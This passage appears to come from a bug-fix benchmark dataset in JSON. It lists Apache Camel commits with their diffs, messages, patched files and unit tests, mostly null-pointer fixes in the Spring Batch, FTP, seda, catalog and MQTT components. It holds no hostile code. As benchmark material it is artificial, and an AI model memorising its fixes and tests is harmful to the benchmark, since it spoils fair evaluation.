                "patch": "@@ -117,6 +117,22 @@ public void shouldConvertHeadersToJobParams() throws Exception {\n         String parameter = jobParameters.getValue().getString(headerKey);\n         assertEquals(parameter, headerValue);\n     }\n+    \n+    @Test \n+    public void setNullValueToJobParams() throws Exception {\n+     // Given\n+        String headerKey = \"headerKey\";\n+        Date headerValue = null;\n+\n+        // When\n+        template.sendBodyAndHeader(\"direct:start\", \"Start the job, please.\", headerKey, headerValue);\n+\n+        // Then\n+        ArgumentCaptor<JobParameters> jobParameters = ArgumentCaptor.forClass(JobParameters.class);\n+        verify(jobLauncher).run(any(Job.class), jobParameters.capture());\n+        Date parameter = jobParameters.getValue().getDate(headerKey);\n+        assertEquals(parameter, headerValue);\n+    }\n \n     @Test\n     public void shouldConvertDateHeadersToJobParams() throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/72d8e95308942880ab87f6cbe2ec3dfa0f33b2dd/components/camel-spring-batch/src/test/java/org/apache/camel/component/spring/batch/SpringBatchEndpointTest.java",
                "sha": "7789a1aee82aa8764c452006bbe091ab9f79b52f",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5733 Fixed the NPE with SpringBatchProducer and null header value\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1401159 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/958067089897e748ad769e19c51ec69e3a9fa504",
        "patched_files": [
            "SpringBatchEndpoint.java",
            "SpringBatchProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SpringBatchEndpointTest.java"
        ]
    },
    "camel_73ce0ec": {
        "bug_id": "camel_73ce0ec",
        "commit": "https://github.com/apache/camel/commit/73ce0ec14c26683b3dad907b4faf8ef563a8100a",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java?ref=73ce0ec14c26683b3dad907b4faf8ef563a8100a",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "patch": "@@ -279,7 +279,12 @@ public String getParent() {\n             parent = path.getParent();\n         } else {\n             String name = getRelativeFilePath();\n-            File path = new File(endpointPath, name);\n+            File path;\n+            if (name != null) {\n+                path = new File(endpointPath, name);\n+            } else {\n+                path = new File(endpointPath);\n+            }\n             parent = path.getParent();\n         }\n         return normalizePathToProtocol(parent);",
                "raw_url": "https://github.com/apache/camel/raw/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "sha": "570acd80fa8537d6ec6276caab9529730f84f984",
                "status": "modified"
            },
            {
                "additions": 17,
                "blob_url": "https://github.com/apache/camel/blob/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/main/java/org/apache/camel/util/FileUtil.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/FileUtil.java?ref=73ce0ec14c26683b3dad907b4faf8ef563a8100a",
                "deletions": 5,
                "filename": "camel-core/src/main/java/org/apache/camel/util/FileUtil.java",
                "patch": "@@ -130,13 +130,25 @@ public static String stripFirstLeadingSeparator(String name) {\n      * Strip any trailing separators\n      */\n     public static String stripTrailingSeparator(String name) {\n-        if (name == null) {\n-            return null;\n+        if (ObjectHelper.isEmpty(name)) {\n+            return name;\n+        }\n+        \n+        String s = name;\n+        \n+        // there must be some leading text, as we should only remove trailing separators \n+        while (s.endsWith(\"/\") || s.endsWith(File.separator)) {\n+            s = s.substring(0, s.length() - 1);\n         }\n-        while (name.endsWith(\"/\") || name.endsWith(File.separator)) {\n-            name = name.substring(0, name.length() - 1);\n+        \n+        // if the string is empty, that means there was only trailing slashes, and no leading text\n+        // and so we should then return the original name as is\n+        if (ObjectHelper.isEmpty(s)) {\n+            return name;\n+        } else {\n+            // return without trailing slashes\n+            return s;\n         }\n-        return name;\n     }\n \n     /**",
                "raw_url": "https://github.com/apache/camel/raw/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/main/java/org/apache/camel/util/FileUtil.java",
                "sha": "ae8e1ee9a34251f9ec5a235f605fc86528291d94",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/test/java/org/apache/camel/util/FileUtilTest.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/util/FileUtilTest.java?ref=73ce0ec14c26683b3dad907b4faf8ef563a8100a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/util/FileUtilTest.java",
                "patch": "@@ -75,6 +75,11 @@ public void testStripTrailingSeparator() {\n         assertEquals(\"/foo/bar\", FileUtil.stripTrailingSeparator(\"/foo/bar/\"));\n         assertEquals(\"/foo/bar\", FileUtil.stripTrailingSeparator(\"/foo/bar//\"));\n         assertEquals(\"/foo/bar\", FileUtil.stripTrailingSeparator(\"/foo/bar///\"));\n+\n+        assertEquals(\"/foo\", FileUtil.stripTrailingSeparator(\"/foo\"));\n+        assertEquals(\"/foo\", FileUtil.stripTrailingSeparator(\"/foo/\"));\n+        assertEquals(\"/\", FileUtil.stripTrailingSeparator(\"/\"));\n+        assertEquals(\"//\", FileUtil.stripTrailingSeparator(\"//\"));\n     }\n \n     public void testStripPath() {",
                "raw_url": "https://github.com/apache/camel/raw/73ce0ec14c26683b3dad907b4faf8ef563a8100a/camel-core/src/test/java/org/apache/camel/util/FileUtilTest.java",
                "sha": "a5bd5e62f82b937e7523c735c30e4dd5b3943b0e",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/73ce0ec14c26683b3dad907b4faf8ef563a8100a/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpComponent.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpComponent.java?ref=73ce0ec14c26683b3dad907b4faf8ef563a8100a",
                "deletions": 2,
                "filename": "components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpComponent.java",
                "patch": "@@ -52,8 +52,8 @@ public FtpComponent(CamelContext context) {\n     }\n \n     /**\n-     * get the base uri part before the options as they can be non URI valid such as the expression using $ chars\n-     * and the URI constructor will regard $ as an illegal character and we dont want to enforce end users to\n+     * Get the base uri part before the options as they can be non URI valid such as the expression using $ chars\n+     * and the URI constructor will regard $ as an illegal character and we don't want to enforce end users to\n      * to escape the $ for the expression (file language)\n      */\n     protected String getBaseUri(String uri) {",
                "raw_url": "https://github.com/apache/camel/raw/73ce0ec14c26683b3dad907b4faf8ef563a8100a/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/FtpComponent.java",
                "sha": "56bdeeec0cb73ae05db12bf871a291684540baa8",
                "status": "modified"
            },
            {
                "additions": 78,
                "blob_url": "https://github.com/apache/camel/blob/73ce0ec14c26683b3dad907b4faf8ef563a8100a/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpTwoSlashesIssueTest.java",
                "changes": 78,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpTwoSlashesIssueTest.java?ref=73ce0ec14c26683b3dad907b4faf8ef563a8100a",
                "deletions": 0,
                "filename": "components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpTwoSlashesIssueTest.java",
                "patch": "@@ -0,0 +1,78 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.file.remote;\n+\n+import java.io.File;\n+\n+import org.apache.camel.Endpoint;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Producer;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.junit.Before;\n+import org.junit.Test;\n+\n+/**\n+ * Issue with using 2 slashes\n+ */\n+public class FromFtpTwoSlashesIssueTest extends FtpServerTestSupport {\n+\n+    protected String getFtpUrl() {\n+        return \"ftp://admin@localhost:\" + getPort() + \"//?password=admin\";\n+    }\n+\n+    @Override\n+    @Before\n+    public void setUp() throws Exception {\n+        super.setUp();\n+        prepareFtpServer();\n+    }\n+    \n+    @Test\n+    public void testPollFileAndShouldBeDeleted() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"Hello World\");\n+\n+        mock.assertIsSatisfied();\n+    }\n+\n+    private void prepareFtpServer() throws Exception {\n+        // prepares the FTP Server by creating a file on the server that we want to unit\n+        // test that we can pool and store as a local file\n+        Endpoint endpoint = context.getEndpoint(getFtpUrl());\n+        Exchange exchange = endpoint.createExchange();\n+        exchange.getIn().setBody(\"Hello World\");\n+        exchange.getIn().setHeader(Exchange.FILE_NAME, \"hello.txt\");\n+        Producer producer = endpoint.createProducer();\n+        producer.start();\n+        producer.process(exchange);\n+        producer.stop();\n+\n+        // assert file is created\n+        File file = new File(FTP_ROOT_DIR + \"/hello.txt\");\n+        file = file.getAbsoluteFile();\n+        assertTrue(\"The file should exists\", file.exists());\n+    }\n+\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() throws Exception {\n+                from(getFtpUrl()).to(\"mock:result\");\n+            }\n+        };\n+    }\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/73ce0ec14c26683b3dad907b4faf8ef563a8100a/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/FromFtpTwoSlashesIssueTest.java",
                "sha": "51415ae5afba9bd78397ae5d5030f7cfdc3ba667",
                "status": "added"
            }
        ],
        "message": "CAMEL-4850: Fixed NPE in ftp consumer if using empty starting directory with just two slashes.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1226387 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/81ae5e1d60bdfbd827c408d53baf0efee4b913c4",
        "patched_files": [
            "GenericFile.java",
            "FileUtil.java",
            "FtpComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FileUtilTest.java",
            "FromFtpTwoSlashesIssueTest.java"
        ]
    },
    "camel_759cfd0": {
        "bug_id": "camel_759cfd0",
        "commit": "https://github.com/apache/camel/commit/759cfd0b1586793dbf6eb335eba1e894b713f0db",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/759cfd0b1586793dbf6eb335eba1e894b713f0db/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=759cfd0b1586793dbf6eb335eba1e894b713f0db",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -1659,7 +1659,7 @@ public void setupRoutes(boolean done) {\n \n     public synchronized RouteDefinition getRouteDefinition(String id) {\n         for (RouteDefinition route : routeDefinitions) {\n-            if (route.getId().equals(id)) {\n+            if (route.getId() != null && route.getId().equals(id)) {\n                 return route;\n             }\n         }",
                "raw_url": "https://github.com/apache/camel/raw/759cfd0b1586793dbf6eb335eba1e894b713f0db/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "0cd26f6cc08a88af888e5e4f84e9eaf9481adc30",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8077: Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/e4331eefa001a029e6c2c388dad1a2a8d90ebef5",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_791979c": {
        "bug_id": "camel_791979c",
        "commit": "https://github.com/apache/camel/commit/791979c8e037cba89d538b8f119be374afae42bc",
        "file": [
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/791979c8e037cba89d538b8f119be374afae42bc/core/camel-base/src/main/java/org/apache/camel/runtimecatalog/impl/AbstractCamelCatalog.java",
                "changes": 20,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-base/src/main/java/org/apache/camel/runtimecatalog/impl/AbstractCamelCatalog.java?ref=791979c8e037cba89d538b8f119be374afae42bc",
                "deletions": 9,
                "filename": "core/camel-base/src/main/java/org/apache/camel/runtimecatalog/impl/AbstractCamelCatalog.java",
                "patch": "@@ -765,15 +765,17 @@ public EndpointValidationResult validateEndpointProperties(String uri, boolean i\n             boolean multiValued = isPropertyMultiValue(rows, key);\n             if (multiValued) {\n                 String prefix = getPropertyPrefix(rows, key);\n-                // extra all the multi valued options\n-                Map<String, Object> values = URISupport.extractProperties(parameters, prefix);\n-                // build a string with the extra multi valued options with the prefix and & as separator\n-                String csb = values.entrySet().stream()\n-                        .map(multi -> prefix + multi.getKey() + \"=\" + (multi.getValue() != null ? multi.getValue().toString() : \"\"))\n-                        .collect(Collectors.joining(\"&\"));\n-                // append the extra multi-values to the existing (which contains the first multi value)\n-                if (!csb.isEmpty()) {\n-                    value = value + \"&\" + csb;\n+                if (prefix != null) {\n+                    // extra all the multi valued options\n+                    Map<String, Object> values = URISupport.extractProperties(parameters, prefix);\n+                    // build a string with the extra multi valued options with the prefix and & as separator\n+                    String csb = values.entrySet().stream()\n+                            .map(multi -> prefix + multi.getKey() + \"=\" + (multi.getValue() != null ? multi.getValue().toString() : \"\"))\n+                            .collect(Collectors.joining(\"&\"));\n+                    // append the extra multi-values to the existing (which contains the first multi value)\n+                    if (!csb.isEmpty()) {\n+                        value = value + \"&\" + csb;\n+                    }\n                 }\n             }\n ",
                "raw_url": "https://github.com/apache/camel/raw/791979c8e037cba89d538b8f119be374afae42bc/core/camel-base/src/main/java/org/apache/camel/runtimecatalog/impl/AbstractCamelCatalog.java",
                "sha": "10238760bea976952b5d047d589838f9e1510ea8",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/640820556a0ff4158291f4f68347d62c176e2a34",
        "patched_files": [
            "AbstractCamelCatalog.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AbstractCamelCatalogTest.java"
        ]
    },
    "camel_7bd1a7d": {
        "bug_id": "camel_7bd1a7d",
        "commit": "https://github.com/apache/camel/commit/7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd/camel-core/src/main/java/org/apache/camel/component/seda/SedaEndpoint.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/seda/SedaEndpoint.java?ref=7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/component/seda/SedaEndpoint.java",
                "patch": "@@ -179,12 +179,13 @@ public PollingConsumer createPollingConsumer() throws Exception {\n         }\n     }\n \n+    /**\n+     * Get's the {@link QueueReference} for the this endpoint.\n+     * @return the reference, or <tt>null</tt> if no queue reference exists.\n+     */\n     public synchronized QueueReference getQueueReference() {\n         String key = getComponent().getQueueKey(getEndpointUri());\n-        QueueReference ref =  getComponent().getQueueReference(key);\n-        if (ref == null) {\n-            LOG.warn(\"There was no queue reference for the endpoint {0}\", getEndpointUri());\n-        }\n+        QueueReference ref = getComponent().getQueueReference(key);\n         return ref;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd/camel-core/src/main/java/org/apache/camel/component/seda/SedaEndpoint.java",
                "sha": "397beabc2e02501b5af9b59354384adc5d84882e",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd/camel-core/src/main/java/org/apache/camel/component/seda/SedaProducer.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/seda/SedaProducer.java?ref=7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/seda/SedaProducer.java",
                "patch": "@@ -210,8 +210,14 @@ protected void doStop() throws Exception {\n      * @param exchange the exchange to add to the queue\n      */\n     protected void addToQueue(Exchange exchange) throws SedaConsumerNotAvailableException {\n+        BlockingQueue<Exchange> queue = null;\n         QueueReference queueReference = endpoint.getQueueReference();\n-        BlockingQueue<Exchange> queue = queueReference.getQueue();\n+        if (queueReference != null) {\n+            queue = queueReference.getQueue();\n+        }\n+        if (queue == null) {\n+            throw new SedaConsumerNotAvailableException(\"No queue available on endpoint: \" + endpoint, exchange);\n+        }\n \n         if (endpoint.isFailIfNoConsumers() && !queueReference.hasConsumers()) {\n             throw new SedaConsumerNotAvailableException(\"No consumers available on endpoint: \" + endpoint, exchange);",
                "raw_url": "https://github.com/apache/camel/raw/7bd1a7dea8d5e8d441daf991f57c08a3aa3fb3bd/camel-core/src/main/java/org/apache/camel/component/seda/SedaProducer.java",
                "sha": "81a2e4c7125ec3ce7c4e356795d9f00f966615fd",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in seda producer.",
        "parent": "https://github.com/apache/camel/commit/5c8b2e953a7e7b23f849849a14ff8a018faa586c",
        "patched_files": [
            "SedaEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SedaEndpointTest.java"
        ]
    },
    "camel_7c9b538": {
        "bug_id": "camel_7c9b538",
        "commit": "https://github.com/apache/camel/commit/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTComponent.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTComponent.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 1,
                "filename": "components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTComponent.java",
                "patch": "@@ -22,7 +22,7 @@\n import org.apache.camel.impl.DefaultComponent;\n \n /**\n- * MQTT component\n+ * MQTT Component\n  */\n public class MQTTComponent extends DefaultComponent {\n ",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTComponent.java",
                "sha": "3e3444a122801917e16455958ed78b7ec65957d1",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConfiguration.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConfiguration.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 6,
                "filename": "components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConfiguration.java",
                "patch": "@@ -20,6 +20,7 @@\n import org.fusesource.mqtt.client.QoS;\n \n public class MQTTConfiguration extends MQTT {\n+\n     /**\n      * These a properties that are looked for in an Exchange - to publish to\n      */\n@@ -28,7 +29,7 @@\n     private String mqttQosPropertyName = \"MQTTQos\";\n \n     /**\n-     * These are set on the Endpoint - together with properties inheritted from MQTT\n+     * These are set on the Endpoint - together with properties inherited from MQTT\n      */\n     private String subscribeTopicName = \"\";\n     private String publishTopicName = \"camel/mqtt/test\";\n@@ -40,7 +41,6 @@\n     private boolean byDefaultRetain;\n     private QoS qos = QoS.AT_LEAST_ONCE;\n \n-\n     public String getQualityOfService() {\n         return qualityOfService;\n     }\n@@ -94,7 +94,6 @@ public void setMqttQosPropertyName(String mqttQosPropertyName) {\n         this.mqttQosPropertyName = mqttQosPropertyName;\n     }\n \n-\n     public int getConnectWaitInSeconds() {\n         return connectWaitInSeconds;\n     }\n@@ -119,7 +118,6 @@ public void setSendWaitInSeconds(int sendWaitInSeconds) {\n         this.sendWaitInSeconds = sendWaitInSeconds;\n     }\n \n-\n     public boolean isByDefaultRetain() {\n         return byDefaultRetain;\n     }\n@@ -128,9 +126,7 @@ public void setByDefaultRetain(boolean byDefaultRetain) {\n         this.byDefaultRetain = byDefaultRetain;\n     }\n \n-\n     static QoS getQoS(String qualityOfService) {\n-\n         for (QoS q : QoS.values()) {\n             if (q.name().equalsIgnoreCase(qualityOfService)) {\n                 return q;\n@@ -147,6 +143,7 @@ static QoS getQoS(String qualityOfService) {\n         }\n         throw new IllegalArgumentException(\"There is no QoS with name \" + qualityOfService);\n     }\n+\n }\n \n ",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConfiguration.java",
                "sha": "86510b49f1134c1c35152e709400e6bc667249ef",
                "status": "modified"
            },
            {
                "additions": 18,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConsumer.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConsumer.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 4,
                "filename": "components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConsumer.java",
                "patch": "@@ -21,21 +21,35 @@\n import org.apache.camel.impl.DefaultConsumer;\n \n public class MQTTConsumer extends DefaultConsumer {\n+\n     public MQTTConsumer(MQTTEndpoint endpoint, Processor processor) {\n         super(endpoint, processor);\n     }\n \n+    @Override\n+    public MQTTEndpoint getEndpoint() {\n+        return (MQTTEndpoint) super.getEndpoint();\n+    }\n+\n     protected void doStart() throws Exception {\n-        ((MQTTEndpoint) getEndpoint()).addConsumer(this);\n+        getEndpoint().addConsumer(this);\n         super.doStart();\n     }\n \n     protected void doStop() throws Exception {\n-        ((MQTTEndpoint) getEndpoint()).removeConsumer(this);\n+        getEndpoint().removeConsumer(this);\n         super.doStop();\n     }\n \n-    void processExchange(Exchange exchange) throws Exception {\n-        getProcessor().process(exchange);\n+    void processExchange(Exchange exchange) {\n+        try {\n+            getProcessor().process(exchange);\n+        } catch (Throwable e) {\n+            exchange.setException(e);\n+        }\n+\n+        if (exchange.getException() != null) {\n+            getExceptionHandler().handleException(\"Error processing exchange.\", exchange, exchange.getException());\n+        }\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTConsumer.java",
                "sha": "934e4190f93e6a5b833dd43e9320bc9bf70c5d96",
                "status": "modified"
            },
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTEndpoint.java",
                "changes": 29,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTEndpoint.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 18,
                "filename": "components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTEndpoint.java",
                "patch": "@@ -53,14 +53,12 @@ public MQTTEndpoint(String uri, MQTTComponent component, MQTTConfiguration prope\n \n     @Override\n     public Consumer createConsumer(Processor processor) throws Exception {\n-        MQTTConsumer consumer = new MQTTConsumer(this, processor);\n-        return consumer;\n+        return new MQTTConsumer(this, processor);\n     }\n \n     @Override\n     public Producer createProducer() throws Exception {\n-        MQTTProducer producer = new MQTTProducer(this);\n-        return producer;\n+        return new MQTTProducer(this);\n     }\n \n     public MQTTConfiguration getConfiguration() {\n@@ -74,44 +72,39 @@ protected void doStart() throws Exception {\n \n         connection.listener(new Listener() {\n             public void onConnected() {\n-                LOG.info(\"MQTT Endpoint Connected to \" + configuration.getHost());\n+                LOG.info(\"MQTT Connection connected to {}\", configuration.getHost());\n             }\n \n             public void onDisconnected() {\n-                LOG.debug(\"MQTT Connection disconnected\");\n+                LOG.debug(\"MQTT Connection disconnected from {}\", configuration.getHost());\n             }\n \n             public void onPublish(UTF8Buffer topic, Buffer body, Runnable ack) {\n-\n                 if (!consumers.isEmpty()) {\n                     Exchange exchange = createExchange();\n                     exchange.getIn().setBody(body.toByteArray());\n                     exchange.setProperty(configuration.getMqttTopicPropertyName(), topic.toString());\n                     for (MQTTConsumer consumer : consumers) {\n-                        try {\n-                            consumer.processExchange(exchange);\n-                        } catch (Exception e) {\n-                            LOG.error(\"Failed to process exchange \", exchange);\n-                        }\n+                        consumer.processExchange(exchange);\n                     }\n                 }\n                 if (ack != null) {\n                     ack.run();\n                 }\n-\n             }\n \n             public void onFailure(Throwable value) {\n                 connection.disconnect(new Callback<Void>() {\n                     public void onSuccess(Void value) {\n                     }\n \n-                    public void onFailure(Throwable value) {\n-                        LOG.debug(\"Failed to disconnect from \" + configuration.getHost());\n+                    public void onFailure(Throwable e) {\n+                        LOG.debug(\"Failed to disconnect from \" + configuration.getHost() + \". This exception is ignored.\", e);\n                     }\n                 });\n             }\n         });\n+\n         final Promise<Object> promise = new Promise<Object>();\n         connection.connect(new Callback<Void>() {\n             public void onSuccess(Void value) {\n@@ -161,8 +154,8 @@ public void onFailure(Throwable value) {\n         super.doStop();\n     }\n \n-    void publish(String topic, byte[] payload, QoS qoS, boolean retain) throws Exception {\n-        connection.publish(topic, payload, qoS, retain, null);\n+    void publish(String topic, byte[] payload, QoS qoS, boolean retain, Callback<Void> callback) throws Exception {\n+        connection.publish(topic, payload, qoS, retain, callback);\n     }\n \n     void addConsumer(MQTTConsumer consumer) {\n@@ -174,6 +167,6 @@ void removeConsumer(MQTTConsumer consumer) {\n     }\n \n     public boolean isSingleton() {\n-        return false;\n+        return true;\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTEndpoint.java",
                "sha": "a1ce92748130b8ad28f2fb86042919d2efa3c5bb",
                "status": "modified"
            },
            {
                "additions": 35,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTProducer.java",
                "changes": 52,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTProducer.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 17,
                "filename": "components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTProducer.java",
                "patch": "@@ -20,6 +20,7 @@\n import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.impl.DefaultAsyncProducer;\n+import org.fusesource.mqtt.client.Callback;\n import org.fusesource.mqtt.client.QoS;\n \n public class MQTTProducer extends DefaultAsyncProducer implements Processor {\n@@ -29,41 +30,58 @@\n     public MQTTProducer(MQTTEndpoint mqttEndpoint) {\n         super(mqttEndpoint);\n         this.mqttEndpoint = mqttEndpoint;\n-\n     }\n \n     @Override\n-    public boolean process(Exchange exchange, AsyncCallback asyncCallback) {\n-        try {\n-            doProcess(exchange);\n-        } catch (Exception e) {\n-            exchange.setException(e);\n-        }\n-        asyncCallback.done(true);\n-        return true;\n-    }\n-\n-    void doProcess(Exchange exchange) throws Exception {\n+    public boolean process(final Exchange exchange, final AsyncCallback callback) {\n         byte[] body = exchange.getIn().getBody(byte[].class);\n         if (body != null) {\n             MQTTConfiguration configuration = mqttEndpoint.getConfiguration();\n-            boolean retain = configuration.isByDefaultRetain();\n+            boolean retain = exchange.getProperty(configuration.getMqttRetainPropertyName(), configuration.isByDefaultRetain(), Boolean.class);\n \n-            if (exchange.getProperty(configuration.getMqttRetainPropertyName()) != null) {\n-                retain = exchange.getProperty(configuration.getMqttRetainPropertyName(), Boolean.class);\n-            }\n             QoS qoS = configuration.getQoS();\n             Object qoSValue = exchange.getProperty(configuration.getMqttQosPropertyName());\n             if (qoSValue != null) {\n                 qoS = MQTTConfiguration.getQoS(qoSValue.toString());\n             }\n \n+            // where should we publish to\n             String topicName = configuration.getPublishTopicName();\n             Object topicValue = 